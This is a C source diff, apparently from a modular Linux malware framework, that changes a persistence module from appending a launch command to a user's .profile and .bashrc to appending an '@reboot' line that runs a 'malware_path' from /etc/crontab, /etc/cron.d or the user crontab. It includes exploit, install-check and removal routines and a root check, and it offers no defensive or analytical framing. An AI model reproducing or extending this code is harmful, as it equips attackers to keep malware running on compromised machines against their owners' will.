@@ -11,18 +11,20 @@
 
 #pragma region Configuration
 
-	#define        CHECKED_FILES_COUNT               2
-	#define        PROFILE_PATH                      ".profile"
-	#define        BASH_RC                           ".bashrc"
+	#define        CHECKED_FILES_COUNT               3
+	#define        PACKAGES_CRONTAB_FOLDER           "/etc/cron.d"
+	#define        USER_CRONTAB_FOLDER               "/var/spool/cron/crontabs"
+	#define        SYSTEM_CRONTAB_FILE               "/etc/crontab"
 
-	#define        RUN_COMMAND_FORMAT                "%s\n"
+	#define        RUN_COMMAND_BUFFER_SIZE           64
+	#define        RUN_COMMAND_FORMAT                "@reboot %s\n"
 
 #pragma endregion
 
 #pragma region GlobalVariables
 
 	char *checked_files[CHECKED_FILES_COUNT];
-	char *home_path = NULL;
+	char run_command_buffer[RUN_COMMAND_BUFFER_SIZE];
 	int exploitable_file_index = -1;
 
 #pragma endregion
@@ -31,11 +33,8 @@
 
 void __attribute__ ((constructor)) on_dlopen(void){
 
-	get_user_home_directory(&home_path);
-
-	// Generate all checked files
-	concat_path_with_filename(checked_files + __COUNTER__, home_path, PROFILE_PATH);
-	concat_path_with_filename(checked_files + __COUNTER__, home_path, BASH_RC);
+	// Generate a part of checked files
+	copy_string(checked_files + __COUNTER__, SYSTEM_CRONTAB_FILE, 0);
 
 }
 
@@ -43,7 +42,6 @@ void __attribute__ ((destructor)) on_dlclose(void){
 
 	int i;
 
-	free(home_path);
 	for (i = 0; i < CHECKED_FILES_COUNT; i++){
 		free(checked_files[i]);
 	}
@@ -57,6 +55,10 @@ void __attribute__ ((destructor)) on_dlclose(void){
 extern int is_compatible(ENVIRONMENT *env){
 
 	int i, ret_val;
+
+	// Generate the rest of the checked files
+	concat_path_with_filename(checked_files + __COUNTER__, PACKAGES_CRONTAB_FOLDER, env->fake_name);
+	concat_path_with_filename(checked_files + __COUNTER__, USER_CRONTAB_FOLDER, env->fake_name);
 
 	// If root, then the exploit can be executed
 	if (env->is_root){
@@ -84,13 +86,15 @@ extern int exploit(ENVIRONMENT *env){
 
 	FILE *opened_file;
 
-	// If the vulnerable file is not setted yet, set it
 	if (exploitable_file_index == -1)
 		is_compatible(env);
 
-	// Apend the run command to file
+	// Compose the command that will be appended
+	sprintf(run_command_buffer, RUN_COMMAND_FORMAT, env->malware_path);
+
+	// Add line to file
 	opened_file = fopen(checked_files[exploitable_file_index], "a");
-	fprintf(opened_file, RUN_COMMAND_FORMAT, env->malware_path);
+	fputs(run_command_buffer, opened_file);
 	fclose(opened_file);
 
 	// Return
@@ -103,14 +107,15 @@ extern int is_installed(ENVIRONMENT *env){
 	char *content = NULL;
 	int ret_val = 0;
 
-	// If the vulnerable file is not setted yet, set it
+	// If the index is not already setted, call the method
 	if (exploitable_file_index == -1)
 		is_compatible(env);
 
+	// Get file content
 	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){
 
-		// Check if the run command is present in file
-		if (strstr(content, env->malware_path) != NULL){
+		// Verify if the run command is present
+		if (strstr(content, run_command_buffer) != NULL){
 			ret_val = 1;
 		}
 
@@ -128,14 +133,14 @@ extern int delete_installed(ENVIRONMENT *env){
 
 	char *content = NULL;
 
-	// If the vulnerable file is not setted yet, set it
+	// If the index is not already setted, call the method
 	if (exploitable_file_index == -1)
 		is_compatible(env);
 
 	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){
 
-		// Remove all occurences of the run command from the file
-		remove_all_substring_occurences(content, env->malware_path);
+		// Replace the occurences of the run command
+		remove_all_substring_occurences(content, run_command_buffer);
 		create_file(checked_files[exploitable_file_index], content);
 
 		free(content);
